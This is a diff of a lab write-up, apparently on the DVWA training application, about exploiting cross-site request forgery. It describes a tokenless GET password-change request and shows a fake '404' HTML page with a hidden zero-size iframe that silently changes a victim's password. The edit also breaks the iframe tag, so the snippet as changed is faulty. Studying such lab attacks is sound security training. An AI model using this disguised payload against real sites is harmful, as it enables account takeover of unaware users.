@@ -39,7 +39,7 @@
 2. After having a look at network in dev tools the request is a GET request when changing pass
 3. Also observed if you have a look in the URL after changing the password the params are very easily editable to change pass
 4. Because there isn't a token in the GET request, we don't need to call a specific cookie/user token to choose what accounts password we are changing.
-5. Here's the HTML page
+5. Here's the iframe snippet
 <pre> ```
 <!DOCTYPE html>
 <html>
@@ -48,7 +48,7 @@
   </head>
   <body>
     <h2>404 Page Not Found</h2>
-    <iframe 
+    <iframe> 
       src="http://192.168.1.117/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change" 
       width="0" 
       height="0" 
